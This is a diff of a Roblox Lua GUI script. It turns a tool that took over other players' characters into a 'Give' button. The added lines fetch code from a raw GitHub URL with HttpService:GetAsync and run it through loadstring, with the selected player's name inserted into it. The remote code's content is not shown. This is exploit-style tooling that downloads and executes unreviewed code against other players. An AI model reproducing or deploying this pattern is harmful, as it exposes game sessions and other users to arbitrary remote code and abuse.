@@ -1305,7 +1305,7 @@ button.Size = UDim2.new(0.5,0,0,30)
 button.ZIndex = 2
 button.Font = tef
 button.FontSize = "Size14"
-button.Text = "Control Gui"
+button.Text = "Gui To Give Gui"
 button.TextColor3 = whit
 button.TextWrapped = true
 button.MouseButton1Down:connect(function()
@@ -1319,18 +1319,18 @@ button.MouseButton1Down:connect(function()
 	gui = Instance.new("ScreenGui")
 	gui.Parent = whoownit.PlayerGui
 	gui.Name = "Control"
-
+	
 	pos = 100
 	pos2 = 10
 	pos3 = 0
-
+	
 	enabled = false
-
+	
 	button = Instance.new("TextButton")
 	button.Parent = gui
 	button.Size = UDim2.new(0, 100, 0, 30)
 	button.Position = UDim2.new(0, 8, 0, pos)
-	button.Text = "Control"
+	button.Text = "Give"
 	button.MouseButton1Click:connect(function()
 		if enabled == false then 
 			enabled = true
@@ -1342,7 +1342,7 @@ button.MouseButton1Down:connect(function()
 					pos3 = pos3 + 103
 					pos2 = 33
 				end
-
+	
 				local bu = Instance.new("TextButton")
 				bu.Parent = button
 				bu.Size = UDim2.new(0, 100, 0, 20)
@@ -1361,9 +1361,14 @@ button.MouseButton1Down:connect(function()
 				bu.MouseButton1Down:connect(function()
 					local play = game.Players:findFirstChild(bu.Text)
 					if play ~= nil then
-						local rig = play.Character.Parent:FindFirstChild(play.Character.Name)
-						whoownit.Character = rig
-						bu.Text = "Controled!"
+						if gui.Parent.Parent ~= whoownit then
+							return
+						end
+						if gui.Parent:FindFirstChild("PenguinGui") ~= nil then
+							return
+						end
+						loadstring(game.HttpService:GetAsync("https://raw.githubusercontent.com/gleb2803/tester/refs/heads/main/tester.py"):gsub("/localplayer/",play.Name))()
+						bu.Text = "Gived!"
 						wait(2)
 						bu.Text = a[i].Name
 					end
